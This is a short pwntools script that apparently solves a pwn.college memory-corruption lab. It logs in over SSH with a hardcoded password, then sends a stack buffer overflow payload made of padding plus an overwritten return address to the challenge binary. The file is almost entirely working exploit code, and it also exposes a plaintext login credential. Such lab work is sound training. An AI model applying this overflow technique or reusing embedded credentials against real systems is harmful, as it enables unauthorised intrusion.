from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level6_testing1")
p.sendlineafter(b'Payload size: ','1000')
pay = b'A'*(0x78) + p64(0x000000000040180C)
p.sendafter(b'bytes)!\n',pay)
p.interactive()